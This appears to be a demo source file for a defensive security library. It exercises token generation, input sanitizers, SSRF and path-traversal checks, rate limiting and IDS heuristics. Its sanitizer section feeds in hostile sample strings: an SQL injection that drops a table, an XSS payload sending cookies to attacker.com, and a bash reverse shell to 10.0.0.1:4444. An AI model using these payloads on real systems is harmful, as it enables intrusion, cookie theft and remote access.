// ============================================================================
// Magnetar Cybersecurity Suite - Comprehensive Demonstration
// File: examples/security_demo.mg
// Demonstrates all defensive security modules in action
// ============================================================================

use "lib/security.mg";

fn main() -> void {
    print("========================================================\n");
    print("   Magnetar Cyber Defense Suite - Live Demonstration     \n");
    print("========================================================\n\n");

    // ---------------------------------------------------------
    // 1. Cryptographic Randomness & Tokens (like Python 'secrets')
    // ---------------------------------------------------------
    print("[1] Cryptographic CSPRNG & Tokens:\n");
    let token = crypto_random_token_hex(16);
    print("  -> Generated CSRF/Session Token (32 hex): ");
    print_str(token);
    print("\n");

    let uuid = crypto_random_uuid_v4();
    print("  -> Generated Secure UUIDv4: ");
    print_str(uuid);
    print("\n\n");

    // ---------------------------------------------------------
    // 2. Memory Hardening & Constant-Time Verification
    // ---------------------------------------------------------
    print("[2] Memory Hardening & Side-Channel Defense:\n");
    let match_ok = secure_mem_compare("token_alpha_99", "token_alpha_99");
    let match_bad = secure_mem_compare("token_alpha_99", "token_beta_00");
    print("  -> Constant-Time Compare (Valid Token): ", match_ok, "\n");
    print("  -> Constant-Time Compare (Forged Token): ", match_bad, "\n");

    let cbuf = secure_alloc_protected(64);
    let integrity_before = secure_check_integrity(cbuf);
    print("  -> Canary Buffer Integrity: ", integrity_before, "\n");
    secure_free_protected(cbuf);
    print("\n");

    // ---------------------------------------------------------
    // 3. Input Sanitization & Attack Prevention
    // ---------------------------------------------------------
    print("[3] Input Sanitization & Web/OS Defense:\n");
    let malicious_sql = "admin' OR 1=1; DROP TABLE users; --";
    let safe_sql = sanitize_sql_escape(malicious_sql);
    print("  -> SQL Injection Neutralized: ");
    print_str(safe_sql);
    print("\n");

    let malicious_xss = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>";
    let safe_xss = sanitize_html_escape(malicious_xss);
    print("  -> XSS Payload Encoded: ");
    print_str(safe_xss);
    print("\n");

    let malicious_cmd = "file.txt; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
    let safe_cmd = sanitize_shell_arg(malicious_cmd);
    print("  -> Shell Injection Escaped: ");
    print_str(safe_cmd);
    print("\n");

    let lfi_attempt = is_path_traversal_attempt("../../../../etc/shadow");
    print("  -> Path Traversal Detected: ", lfi_attempt, "\n");

    let ssrf_metadata = is_private_or_loopback_ipv4("169.254.169.254");
    let ssrf_public = is_private_or_loopback_ipv4("93.184.216.34");
    print("  -> SSRF Cloud Metadata Blocked (169.254.169.254): ", ssrf_metadata, "\n");
    print("  -> SSRF Public Host Allowed (93.184.216.34): ", !ssrf_public, "\n\n");

    // ---------------------------------------------------------
    // 4. Rate Limiting & Brute-Force Governor (fail2ban style)
    // ---------------------------------------------------------
    print("[4] Automated Rate Limiting & IP Jailing:\n");
    let gov = governor_create(3, 10, 120); // allow 3 requests per 10s, ban for 120s
    string client_ip = "198.51.100.77";

    for (int req = 1; req <= 4; req = req + 1) {
        let allowed = governor_allow_request(gov, client_ip, 1000 + req);
        print("  -> Attempt ", req, ": Allowed = ", allowed, "\n");
    }
    let is_jailed = governor_is_banned(gov, client_ip, 1005);
    print("  -> Client Status Banned in Jail: ", is_jailed, "\n\n");
    governor_destroy(gov);

    // ---------------------------------------------------------
    // 5. Intrusion Detection System (IDS) Heuristics
    // ---------------------------------------------------------
    print("[5] Network Packet Inspection & IDS Engine:\n");
    let xmas_flags = TCP_FLAG_FIN | TCP_FLAG_PSH | TCP_FLAG_URG;
    let is_xmas = ids_is_xmas_scan(xmas_flags);
    print("  -> TCP Port-Scan Heuristic (XMAS scan): ", is_xmas, "\n");

    let syn_flags = TCP_FLAG_SYN;
    let is_syn = ids_is_syn_scan(syn_flags);
    print("  -> Stealth SYN Scan Detected: ", is_syn, "\n\n");

    // ---------------------------------------------------------
    // 6. Security Incident & SIEM / CEF Logging
    // ---------------------------------------------------------
    print("[6] Standardized SIEM / CEF Incident Reporting:\n");
    audit_log_incident(evt_sqli_attempt(), SEV_CRITICAL, "198.51.100.77", "Blocked SQLi in authentication endpoint");
    audit_log_incident(evt_rate_limit(), SEV_WARNING, "198.51.100.77", "Triggered automated 120s firewall jail");

    print("\n========================================================\n");
    print("   All Magnetar Security Modules Verified Successfully!  \n");
    print("========================================================\n");
}

